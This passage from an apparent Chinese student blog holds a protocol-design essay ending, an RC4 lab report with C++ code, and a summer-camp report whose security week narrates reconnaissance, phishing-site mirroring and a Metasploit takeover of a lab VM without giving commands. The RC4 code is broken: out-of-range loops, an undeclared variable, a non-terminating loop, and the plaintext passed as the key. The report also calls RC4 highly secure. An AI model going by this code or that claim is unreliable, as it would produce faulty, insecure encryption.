src="/../../../../AppData/Roaming/Typora/typora-user-images/1573794104740.png" alt="1573794104740"></p></li></ol><p><strong>协议描述</strong></p><ol><li>Alice想要和Bob交换密钥并建立通信，首先确定一个会话序列号$M​$用来标记整个协议流程，表明通信双方，再发送一个由Alice与Trent共享密钥加密的Nonce、会话序列号和双方身份。</li><li>Bob收到Alice的通信请求后，将会话序列号、通信双方、转发Alice的加密内容再加上一个由Bob与Trent共享密钥加密的Nonce、会话序列号和双方身份。</li><li>Trent收到消息后分别解密两块加密内容，确认两块密文中的序列号与通信双方是否与明文中相等，若相等则返回给Bob信息：会话序列号、分别由Trent和Alice、Bob共享密钥加密的包含对应Nonce、会话序列号、同通信双方和会话密钥。</li><li>Bob收到消息后解密自己的部分，并确认Nonce和会话序列号的正确性后，将会话序列号、通信双方和Alice和Trent的加密部分发送给Alice。</li><li>Alice收到消息后解密自己的部分，验证序列号，通信双方和Nonce的正确性，若正确则给Bob发送消息：会话序列号、通信双方和由会话密钥加密的会话序列号、通信双方和一个新的Nonce。</li><li>Bob收到消息并使用会话密钥解密后验证会话序列号的正确性，若正确，使用会话密钥加密会话序列号、Alice的新Nonce-1和通信双方发回给Alice。</li><li>Alice收到并解密认证后，协议结束，双方已完成密钥交换和认证。</li></ol><p><strong>协议分析</strong></p><ul><li>所有通信方在接受消息后首先要判断会话序列号$M​$，如果之后的加密内容中的序列号值不匹配则拒收消息。因为此序列号始终需要匹配，攻击者就不能进行替换，从而保证了协议不会受到重放攻击。</li><li>每一个加密消息中都有会话序列号和要共享密钥的通信双方，防止中间人冒充其中一方。</li><li>前两个Nonce$N_A,N_B$只对Trent可见，而对对方不可见，使得只要可以确认此Nonce，就可以确认它来自Trent。</li><li>假设5确保了接收方不会将消息中的某几个部分当成一个部分，也不会将一个部分分成几个部分，有效地避免了归因于类型缺陷的攻击。</li><li>此协议中的明文部分始终只会有序列号和通信双方，所以反射攻击或平行会话攻击不会使得某一方充当预言机。</li><li>为了更高程度地保证安全性，协议中包含了很多的冗余，而这些冗余也可能会使协议的效率有所降低。</li></ul><h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><p>本文探讨了安全通信协议的重要性，对一些具有代表性的密钥交换和认证协议进行了分析梳理，找到了其易受攻击的方法和原因。由此总结了针对协议攻击的若干类型，进而得出设计安全协议的一般原则。最后，作者通过结合这些原则设计出了一套能够抵抗已知攻击的密钥交换和认证协议，并对其进行了详细的描述和分析。</p><p>通过本次作业，我对通信协议的了解程度得到了很大程度的加深，并且对协议的分析也有了一定的实践经验，作为计算机专业的学生这些知识和技能都会在以后的学习工作中派上用场。更加重要的是这种全面考虑的设计思维将对以后各种各样的任务都有积极影响。</p>]]></content>
    
    
    
    <tags>
      
      <tag>N-H protocol</tag>
      
      <tag>Coursework</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RC4实验报告</title>
    <link href="/2019/08/14/2019-8-14-RC4%E5%AE%9E%E9%AA%8C/"/>
    <url>/2019/08/14/2019-8-14-RC4%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="RC4实验"><a href="#RC4实验" class="headerlink" title="RC4实验"></a>RC4实验</h1><h2 id="一、实验背景"><a href="#一、实验背景" class="headerlink" title="一、实验背景"></a>一、实验背景</h2><h4 id="1-对称加密算法"><a href="#1-对称加密算法" class="headerlink" title="1. 对称加密算法"></a>1. 对称加密算法</h4><p>​对称加密，也叫私钥加密，指的是加密密钥和解密密钥相同的密码算法。它要求发送方和接收方在进行加密通信之前共同商定一个密钥，算法的安全性也依赖于这个密钥，泄露密钥就意味着任何人都可以对加密的消息进行解密，所以保管密钥对于对称加密算法的通信十分关键。相比于公钥加密算法，对称加密算法具有计算量小、加密速度快、加密效率高等优点，但也存在多人通信时密钥数量太多所导致的密钥分发和管理难度大的缺点使得其使用成本较高，而且对称密钥无法提供签名功能。常用的对称加密算法有：DES，RC４，IDEA算法等。</p><h4 id="２．流密码"><a href="#２．流密码" class="headerlink" title="２．流密码"></a>２．流密码</h4><p>​流密码，又叫序列密码，是对称加密算法的一种，加密和解密双方使用相同的伪随机加密数据流(pseudo-randomstream)作为密钥，明文数据每次与密钥数据流顺次对应加密，得到密文数据流。这种密码体制只有混淆而没有扩散，与分组密码的最主要区别就是有记忆。流密码根据加密器中的记忆原件的状态$\sigma_i$是否依赖于输入的明文字符，可进一步分为同步和自同步两种。</p><p>​流密码最初主要用于政府、军方等重要部门，因此不像分组密码一样有公开的国际标准，大多的设计和成果都是保密的。但随着其需求的增大，更多公开的流密码技术也渐渐出现，如FISH，Helix，RC4，A5等。</p><h4 id="3-RC4加密算法"><a href="#3-RC4加密算法" class="headerlink" title="3. RC4加密算法"></a>3. RC4加密算法</h4><p>​RC4（Rivest Cipher 4），是一种密钥长度可变的流加密算法。其原理主要包括了初始化算法（KSA）：基于输入对称密钥K，置换状态数组；和伪随机子密码生成算法（PRNG）：扩充状态数组，加密明文数据两个部分。初始化的作用是将S盒打乱，确保每个元素都会被随机处理。而伪随机子密码生成算法则是产生伪随机流，与明文进行异或后产生密文。由于使用异或运算进行加密，RC4算法存在密钥序列重复从而导致的被破解的风险，在2015年，比利时鲁汶大学的研究人员也在75小时内获得了有RC4加密的明文。</p><p>​</p><h2 id="二、实现原理"><a href="#二、实现原理" class="headerlink" title="二、实现原理"></a>二、实现原理</h2><h4 id="1-KSA算法"><a href="#1-KSA算法" class="headerlink" title="1. KSA算法"></a>1. KSA算法</h4><p>​KSA算法的目标是基于输入的密钥K产生状态数组的一个置换，主要步骤为先初始化一个单位数组S，再根据密码的位数对S进行基于密钥K的置换得到本次加密的状态数组。以下为具体代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> *S <span class="hljs-title">RC4_KSA</span><span class="hljs-params">(<span class="hljs-type">int</span> K[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//RC4 KSA</span><br>    <span class="hljs-type">int</span> S[<span class="hljs-number">256</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">255</span>;i++)<br>    &#123;<br>        S[i]=i; <span class="hljs-comment">//初始化单位数组</span><br>    &#125;<br>    <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>, temp;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">255</span>;i++)  <span class="hljs-comment">//256轮置换</span><br>    &#123;<br>        j=(j+s[i]+K[i%(<span class="hljs-built_in">length</span>(K))])% <span class="hljs-number">256</span>;<br>        temp=S[i];<br>        S[i]=S[j];<br>        S[j]=temp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> S;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-PRNG算法"><a href="#2-PRNG算法" class="headerlink" title="2. PRNG算法"></a>2. PRNG算法</h4><p>​此算法的目的是使用上一步的置换数组来产生伪随机序列，与明文异或产生密文。原理和代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> *C <span class="hljs-title">RC4</span><span class="hljs-params">(<span class="hljs-type">int</span> S[], <span class="hljs-type">int</span> M[])</span> <span class="hljs-comment">//输入S和明文数组</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>, j=<span class="hljs-number">0</span>,temp T[<span class="hljs-number">256</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;(<span class="hljs-built_in">length</span>(M)))<br>    &#123;<br>        i=(i+<span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j=(j+S[i]) % <span class="hljs-number">256</span>;<br>        temp=S[i]; S[i]=S[j]; S[j]=temp;<br>        T[k] = S[(S[i]+S[j]) % <span class="hljs-number">256</span>];<span class="hljs-comment">//产生伪随机序列</span><br>        C[k] = T[k] ^ M[k];<span class="hljs-comment">//明文与伪随机序列异或产生密文</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> C;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、验证和测试"><a href="#三、验证和测试" class="headerlink" title="三、验证和测试"></a>三、验证和测试</h2><h4 id="1-使用openssl进行测试"><a href="#1-使用openssl进行测试" class="headerlink" title="1. 使用openssl进行测试"></a>1. 使用openssl进行测试</h4><p>经查阅文档，在openssl中使用RC4的相关函数为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/rc4.h&gt;</span></span><br><br> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RC4_set_key</span><span class="hljs-params">(RC4_KEY *key, <span class="hljs-type">int</span> len, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data)</span></span>;<br><br> <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RC4</span><span class="hljs-params">(RC4_KEY *key, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *indata,</span></span><br><span class="hljs-params"><span class="hljs-function">          <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *outdata)</span></span>;<br></code></pre></td></tr></table></figure><p>使用Linux下C++编程的完整程序为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;openssl/rc4.h&gt;</span><span class="hljs-comment">//添加RC4的库</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    RC4_KEY rc4_key; <span class="hljs-comment">//生成密钥</span><br>    string p = <span class="hljs-string">&quot;This is the plain text.&quot;</span>; <span class="hljs-comment">//设置明文</span><br>    string key = <span class="hljs-string">&quot;12345ABCDE&quot;</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * cipherText = <span class="hljs-keyword">new</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> [p.<span class="hljs-built_in">length</span>()];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> * plainText = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)p.<span class="hljs-built_in">c_str</span>();<br><br>cout&lt;&lt;<span class="hljs-string">&quot;初始明文为：&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;p.<span class="hljs-built_in">length</span>();i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%0x&quot;</span>,plainText[i]);<br>&#125;<br>cout&lt;&lt;endl;<br>    <br>    <span class="hljs-built_in">RC4_set_key</span>(&amp;rc4_key, key.<span class="hljs-built_in">length</span>(), plainText);<span class="hljs-comment">//设置密钥</span><br>    <span class="hljs-built_in">RC4</span>(&amp;rc4_key, p.<span class="hljs-built_in">length</span>(), plainText, cipherText);<span class="hljs-comment">//进行加密</span><br><br>string cipher = (<span class="hljs-type">char</span> *)cipherText;<br>cout&lt;&lt;<span class="hljs-string">&quot;密文为：&quot;</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;p.<span class="hljs-built_in">length</span>();i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%0x&quot;</span>,cipherText[i]);<br>&#125;<br>cout&lt;&lt;endl;<br><br><span class="hljs-built_in">RC4_set_key</span>(&amp;rc4_key, key.<span class="hljs-built_in">length</span>(), plainText);<span class="hljs-comment">//再次设置密钥（不设置无法解密）</span><br><span class="hljs-built_in">RC4</span>(&amp;rc4_key, p.<span class="hljs-built_in">length</span>(), cipherText, plainText);<span class="hljs-comment">//使用相同密钥解密，获得明文</span><br>cout&lt;&lt;<span class="hljs-string">&quot;解密后得到的明文为：&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;p.<span class="hljs-built_in">length</span>();i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%0x&quot;</span>,plainText[i]);<br>&#125;<br>cout&lt;&lt;endl;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>可见，当前程序的确可以使用openssl中的RC4相关函数进行可逆的加解密运算，也就证明了算法的正确性。</p><h4 id="2-时间开销"><a href="#2-时间开销" class="headerlink" title="2. 时间开销"></a>2. 时间开销</h4><p>openssl中自带了可以测试各种算法性能的函数<strong>speed</strong>指令，本次将RC4与DES，RSA相比，观察其时间开销和性能。</p><p>在Linux命令行输入openssl进入其命令界面后，分别输入：</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-variable language_">speed</span> rc4<br><span class="hljs-variable language_">speed</span> des<br><span class="hljs-variable language_">speed</span> rsa<br></code></pre></td></tr></table></figure><p>结果分别为：</p><p><img src="https://adamyoung71.github.io/img/in-post/post-rc4-exp/fig-1.png" alt="fig-1"></p><p><img src="https://adamyoung71.github.io/img/in-post/post-rc4-exp/fig-2.png" alt="fig-2"></p><p><img src="https://adamyoung71.github.io//img/in-post/post-rc4-exp/fig-3.png" alt="fig-3"></p><p>​综合上面三张图，不难看出，在明文大小相同的情况下RC4的运算速度最快，DES次之，RSA最慢，这也很好地符合了我们的预期。就拿1024bit数据加密来说，RC4在3秒内可以进行超过百万次加密，DES在cbc模式下为3秒进行近二十万次加密，而RSA在10秒内只能进行8万余次的私钥计算和13万余次的公钥加密计算。从这里我们也可以看出RC4在加密效率上有着很高的优越性。</p><h2 id="四、实验结论"><a href="#四、实验结论" class="headerlink" title="四、实验结论"></a>四、实验结论</h2><p>​本次实验，通过深入了解RC4算法的起源，发展和特点，我更加透彻地了解了流密码的算法原理，安全性等。而通过亲自编写程序简易地实现该算法也让我能体会到流密码与分组密码、公钥密码的不同之处。总的来说，RC4是一种安全性很高，密钥长度非常灵活的加密算法，值得我们进行深入的学习。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Cryptography</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>东伦敦大学夏令营</title>
    <link href="/2019/07/30/2019-7-30-%E7%94%9F%E4%BA%A7%E5%AE%9E%E4%B9%A0%E6%8A%A5%E5%91%8A/"/>
    <url>/2019/07/30/2019-7-30-%E7%94%9F%E4%BA%A7%E5%AE%9E%E4%B9%A0%E6%8A%A5%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<h1 id="东伦敦大学生产实习报告"><a href="#东伦敦大学生产实习报告" class="headerlink" title="东伦敦大学生产实习报告"></a>东伦敦大学生产实习报告</h1><h2 id="一、实习项目名称"><a href="#一、实习项目名称" class="headerlink" title="一、实习项目名称"></a>一、实习项目名称</h2><p><strong>2019英国东伦敦大学夏令营</strong></p><h2 id="二、实习时间、地点"><a href="#二、实习时间、地点" class="headerlink" title="二、实习时间、地点"></a>二、实习时间、地点</h2><p><strong>时间：2019年7月15日-2019年8月4日</strong></p><p><strong>地点：英国伦敦市东伦敦大学。</strong></p><h2 id="三、实习任务"><a href="#三、实习任务" class="headerlink" title="三、实习任务"></a>三、实习任务</h2><ol><li><p>进行为期三周的课程：London 2020- Dealing with the impact of cyber security, big data and digitization of business。</p></li><li><p>参观伦敦市及周边的著名历史人文景观，如大英博物馆，白金汉宫等，拓宽视野，感受文化的多样性，增进自己的见识。</p></li></ol><h2 id="四、实习内容"><a href="#四、实习内容" class="headerlink" title="四、实习内容"></a>四、实习内容</h2><p>​早在学期初始，我就注意到了本次夏令营的通知，在综合多方面考虑后我决定报名参加。并且也顺利地通过了面试。之后就一切按计划进行，报名、机票、签证等等。由于是我第一次出国，当时的我显得尤为兴奋，因为在很久以前就非常想到国外看看，因为在网络上，电视上看到的外国总归只是一小部分，日常的生活是看不到的。而且我对英国也有着比较特殊的感情，从小学习英语我喜欢看英国的电视剧，学习英国的英语口音，学了十几年的英语，还从来没有机会将它运用到实际生活中去，这次就是一个绝好的机会。所以，怀揣着期待的心情，我的旅程在七月十五日凌晨四点半准时开启。</p><h4 id="（一）学在东伦敦"><a href="#（一）学在东伦敦" class="headerlink" title="（一）学在东伦敦"></a>（一）学在东伦敦</h4><p>​首先说说学校：我们所在的东伦敦Dockland校区紧邻伦敦城市机场，每隔五分钟就会有飞机从旁边呼啸而过。从住所出发需要乘坐两趟DLR便可以到达校门口，还是非常的方便。校区面积不大，但功能也是应有尽有，整个校区内最大的建筑竟然是体育中心，也足以见得学校对学生发展体育的鼓励和重视。因为是在暑假期间，学校里没有什么人，只有一些和我们一样来参加夏令营的同学们。在完成了注册程序并拿到学生卡后，为期三周的学习生活也就正式开启了。</p><p>​我选择的课程包括大数据，网络安全和移动云应用三个部分，每个部分为期一周。因为学校位置的原因，校园内的建筑也几乎按照Dock来命名，如我们上课的教学楼是Knowledge Dock，还是比较朗朗上口。教学楼内很安静，供老师同学们学习和讨论的公共区域非常多。</p><h5 id="1-大数据技术（Big-Data-Technologies）"><a href="#1-大数据技术（Big-Data-Technologies）" class="headerlink" title="1. 大数据技术（Big Data Technologies）"></a>1. 大数据技术（Big Data Technologies）</h5><p>​第一门课程是由Amin Karami老师教授的大数据课程。现今互联网飞速发展，每天产生的数据都非常巨大，而人力却是很有限的。所以如何处理海量的数据就成为了当今社会发展所要处理的一个非常关键的问题。首先，老师介绍了大数据的具体概念：由于计算机计算能力和存储空间的限制而无法有效处理的大体积的数据。其具备四个基本特点：体积、多样性、处理速度和不确定性。前三个都比较易懂，所以重点解释第四个特点：不确定性是指由于数据的不完整、延迟、无规律或结构混乱而导致的数据不确定。所以我们该如何处理具有这样特征的数据呢？使用更强更大的计算机是一种可能的方案，但毕竟成本太高。所以接下来老师介绍了分布式处理的方法：将大数据分成若干可以直接处理的小部分数据，分别处理，之后再将结果进行汇总。但这样的作法也伴随着一定的挑战，如何将数据进行分割和分布、如何平行计算并且避免出现延迟和错误、如何合并结果当然还有成本的问题。所以就引出了一个非常有用的工具，名为Apache Hadoop。它主要由两部分组成：HDFS（分布式文件系统），Map Reduce（计算系统），分别用来存储和处理数据。具体工作原理如下：![1567064969285](C:\Users\Adam Young\AppData\Roaming\Typora\typora-user-images\1567064969285.png)</p><p>​首先，用户将数据导入HDFS中，按照一定规则分成若干个任务交给若干台计算机进行处理。将分拆的有关信息存入Name Node中，而Job Tracker只关心具体的数据。最终经过Reduce将所有数据合并得到处理结果。</p><p>​接下来，我们在老师的带领下亲自在Linux平台使用Hadoop进行大数据处理。首先下载Java组件和Hadoop组件，然后进行了一些配置如设置批处理文件、对Hadoop进行配置等。之后就是使用环节：建立新的HDFS并将老师所提供的大数据文件导入其中。接下来就是用Java写出我们要对数据进行的处理并将其配置到Hadoop中，在此次实验中我们对一本数百万字小说中的人名数量进行计算，最终得到如下结果（部分）：</p><table><thead><tr><th>Rajee</th><th align="center">Rama</th><th>Arjun</th><th>Keerthi</th><th>Kishore</th><th>Daniel</th><th>Alex</th><th>Nancy</th><th>Adam</th></tr></thead><tbody><tr><td>23</td><td align="center">34</td><td>67</td><td>28</td><td>78</td><td>34</td><td>74</td><td>52</td><td>8</td></tr></tbody></table><p>​接下来，我们又使用了一款叫做SQOOP（Sql to Hadoop）的工具，可以将Hadoop同数据库连接起来以便使用。在具体操作上，我们使用了一款名为Hue Cloudera的在线工具，它拥有非常用户友好的界面，而且可以在线直接给出可视化的结果。首先将文件从本地上传到其在线服务器后，就可以把它当作一个在线的SQL数据库来使用了，非常方便，下图是我进行的一个简单的查询操作：</p><p>![20190718_144401](C:\Users\Adam Young\Pictures\Tours\2019 summer London\20190718_144401.jpg)</p><p>​而最后，我们又实践了一款大数据应用叫做HIVE（意为蜂巢）。是一款在Hadoop上层用来结构化查询和管理数据的工具。它的使用较为复杂故在课程上只做了简单的介绍。</p><p>​这一周的课程紧凑而充实，让对大数据不是很熟悉的我学习到了很多基本的概念，还有很多宝贵的实操经验。</p><h5 id="2-网络安全技术（Cyber-Security）"><a href="#2-网络安全技术（Cyber-Security）" class="headerlink" title="2.  网络安全技术（Cyber Security）"></a>2.  网络安全技术（Cyber Security）</h5><p>​课程进行到第二周，而这周的主题与我的专业息息相关，所以我也额外地用心听讲并且也确实学到了不少东西。</p><p>​在课程介绍中，老师先是介绍了网络安全在现在这个由互联网联系的世界中的重要性，但实现安全就要在功能性和易用性中作出妥协，所以也是一个平衡的问题。之后，老师又说明了可能遭受的攻击的方式，与我们平常认知不同的是，除了有目标的攻击之外，更大规模使用的网络攻击手段是无目标攻击，比如说假的网站或者钓鱼邮件等。这类攻击不针对具体的人，而是无差别的发动等待防范意识比较差的人主动上钩。这也说明每天使用互联网的我们需要提高自己的安全意识来保护自己的隐私和财产安全。紧接着，老师又说明了网络攻击最常见的四个阶段：事先调查，找到漏洞，进行攻击和消除自身痕迹。理论知识只是一些引导和启发，真正关键的则是之后的实践环节，到最后我们会使用黑客手段真正控制另一台计算机。</p><p>​首先是信息收集阶段，我们使用命令行工具ping目标网站，来获取其IP地址，并且可以获取网络上每一跳的对应地址。接着，在pipl这一网站上对想要攻击的目标进行搜索，可以得到目标的各式各样的相关信息如电话、邮箱等等，这些信息都可以作为旁道攻击的依据。接下来是从想要攻击的网站上挖取相关信息，首先需要下载Web Data Extractor这一工具，在安装完成后，只需要输入想要抓取信息网站的域名，再选择一些配置如抓取类型等，工具就会自动从网站上抓取相关信息。如下图为从www. certifiedhacker.com中抓取的电话号码。</p><p>![1567133696893](C:\Users\Adam Young\AppData\Roaming\Typora\typora-user-images\1567133696893.png)</p><p>​接下来的是要根据刚刚抓取的信息制作一个网站的镜像，从而诱导用户打开镜像网站，这里会使用另一个工具：WinHTT Track Website Copier，在输入网址和所要复制的文件格式和种类后就会帮助我们自动复制目标网站。之后，我们又使用邮件跟踪技术找到了目标用户的更多相关信息。</p><p>​至此，信息的收集阶段已经完成，接下来的任务就是进行入侵和攻击。在这个练习中，我们将使用一台Linux虚拟机对另一台Windows虚拟机进行攻击。此处我们将会使用Metasploit这款工具，在经历了若干步骤如获取IP、设置载重、查找漏洞、建立联系后，我们就可以通过查找到的漏洞获取目标主机的管理员权限，并可以在目标主机中建立一个新的文件并写入想要的内容或控制其键盘、鼠标和摄像头等。此处，我在目标主机中新建了一个txt文件并写入hacked（已被黑）。![20190726_104629](C:\Users\Adam Young\Pictures\Tours\2019 summer London\20190726_104629.jpg)</p><p>​最后，我们还练习了如何通过修改启动项重置Kali Linux的root密码，过程也是十分有趣。至此，这一周的课程也就全部结束，我也获得了非常多的收获。比起平时上课中理论占大部分，这里的课程中一大半都是实践课程，我觉得是非常有益的，通过实践我才真正感受到入侵一台电脑需要怎样的技术和过程，虽然因为教学过程会比真实情况简单很多，但最重要的是直观的认识，而不只是纸上谈兵。</p><h5 id="3-移动云应用（Mobile-Cloud-Applications）"><a href="#3-移动云应用（Mobile-Cloud-Applications）" class="headerlink" title="3. 移动云应用（Mobile Cloud Applications）"></a>3. 移动云应用（Mobile Cloud Applications）</h5><p>​在互联网飞速发展的今天，移动设备如智能手机越来越成为人们连接世界的主要工具，而设备只是终端，想要更加方便的使用和获得更好的用户体验不能够只使用浏览器，这就需要更多的应用程序来满足日益增长的移动网络需求。而移动互联网用户的增多又会给服务提供商增加新的挑战：如何处理海量用户所产生的海量数据呢？人工处理肯定是不现实的，用大型计算机又成本太高，所以云计算就成为了一个非常好的选择。基于以上原因，本周的课程我们就将要学习移动应用的设计和制作还有云计算的简单使用。</p><p>​首先我们学习了云计算和移动应用的相关基本知识，然后就到了重点的实践环节。在这个环节中，我们将会使用MIT开发的App Inventor这一在线工具制作移动应用并在手机上进行测试。令我们没想到的是，在上手进行软件开发之前，老师拿出了纸盒彩笔让我们先将自己的设计画在纸上，因为这样的过程能够让我们先进行深思熟虑过后再确定应用的具体样式，而且如果不满意修改也非常方便，只需要再拿一张纸即可。在分组进行设计之后，我们按照设计在网站上实现了基本的界面，并在后台使用其提供的相关组件和逻辑等实现了具体功能，整个过程非常有趣和新奇。和平常编写程序不同的是，这个网站使用的是模块化编程，可视化非常的优秀，而且降低了上手的难度。但不可避免的是这样会降低一定的灵活性，只是在当前练习的情况中已经完全够用。一下为我们设计的一款应用的后台逻辑。</p><p>![20190730_150907](..&#x2F;..&#x2F;..&#x2F;..&#x2F;Pictures&#x2F;Tours&#x2F;2019 summer London&#x2F;20190730_150907.jpg)</p><p>​接下来，老师帮助我们申请到了亚马逊云服务的学生账号以便在其平台使用云服务。亚马逊AWS是当今世界上最大的云服务提供商，在进行了一些相关的配置之后我们就可以在应用中使用云服务接口来上传、下载和处理我们想要的数据了。云服务就像自来水一样，打开开关就能源源不断地提供高品质的服务，而在不需要时也可以很方便的关闭以节约成本，所以说未来一定是云服务的时代。</p><p>​这门课是所有三门课中体验最好的，不光是有有趣的课程内容，更是因为为我们授课的Gaurav教授是一名非常认真负责同时讲课轻松幽默的教师，他每天都会早我们二十分钟就在教室中准备当天的课程，并且还在课程的最后发给我们很多纪念品和奖励，令我印象非常深刻。</p><h4 id="（二）游在伦敦"><a href="#（二）游在伦敦" class="headerlink" title="（二）游在伦敦"></a>（二）游在伦敦</h4><p>​因为每天的课程不是很多，从早上十点开始到下午三点过就结束，所以一天内我还是有很多的时间在伦敦进行探索。既然来到了一个全新的地方，怎么能不好好体会和发现一些值得留念的景色和人文呢？但我又不想只是当作一个游客，上车睡觉，下车拍照，最后一问啥都不知道，这样就未免太肤浅了一些。所以我的想法是尽量不以大团体出行，尽量发现一些更靠近当地人日常生活的场景而不只是旅游景点。以此为方针，在二十多天的时间里，我的足迹覆盖到了大约三分之一伦敦市的面积，想想已经是十分可观了，每天都拖着疲惫的身躯回到寝室，但心里却是十分的满足与快乐。由于篇幅有限，下面我只谈谈令我印象最深刻的几处地点，它们都给我留下了很深刻的印象。</p><p>​首先是大英博物馆，无需过多的解释，我们挑选了一个周中的时间早早到了博物馆。排队的人很少，安检也是只需要打开包看一下就可以通过。进到室内就可以感受到浓浓的艺术气息：白色的幕墙搭配玻璃穹顶，是现代艺术与传统的完美融合。幸运的是，我们去时刚好有日本漫画限时展览，我们也没有错过机会进去大饱眼福了一番，还看到了很多珍贵的手稿。当然，来大英博物馆的重点还是要看其丰富的展品，我按着地图上的顺序逐一参观并认真听取现场的解说，从破解埃及语言的石碑，到启蒙运动的人物雕塑；从精细保存着的木乃伊，到亚洲文明的丝绸和瓷器。与很多中国人不同的是，我并没有对中国的文物产生太大的兴趣，因为我不想心存偏见来看待这些本应该用艺术的眼光欣赏的珍品，即使有种种历史原因，我们也不应时刻计较而让自己心胸太过狭隘。到这里就是要进行文化的熏陶，感受世界文明的多样和多彩。</p><p>​另一行令我印象深刻的是一个不很出名的地点，叫做荷兰公园，坐落在伦敦人均收入最高的区。我在路边曾看到过房屋销售的店铺，在这个区域房屋的均价都要在一百万英镑以上。这里离伦敦市中心只有二十分钟左右的车程，但却出奇的安静，街道上